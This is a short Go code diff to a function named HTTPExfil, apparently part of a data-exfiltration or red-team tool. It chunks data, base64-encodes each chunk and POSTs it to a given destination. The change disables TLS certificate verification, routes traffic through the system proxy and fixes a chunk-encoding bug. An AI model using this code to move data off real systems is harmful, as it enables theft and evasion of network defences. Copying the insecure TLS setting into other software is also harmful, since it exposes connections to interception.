@@ -197,6 +197,11 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 		var stream = bytes.NewReader(b)
 		var tmp [4 * 1024 * 1024]byte
 
+		http.DefaultTransport.(*http.Transport).TLSClientConfig =
+			&tls.Config{InsecureSkipVerify: true}
+		http.DefaultTransport.(*http.Transport).Proxy =
+			getSystemProxy()
+
 		for {
 			if n, e = stream.Read(tmp[:]); (n == 0) && (e == io.EOF) {
 				return nil
@@ -205,7 +210,7 @@ func HTTPExfil(dst string, headers map[string]string) ExfilFunc {
 			}
 
 			// Create request
-			b64 = base64.StdEncoding.EncodeToString(tmp[:])
+			b64 = base64.StdEncoding.EncodeToString(tmp[:n])
 			req, e = http.NewRequest(
 				http.MethodPost,
 				dst,
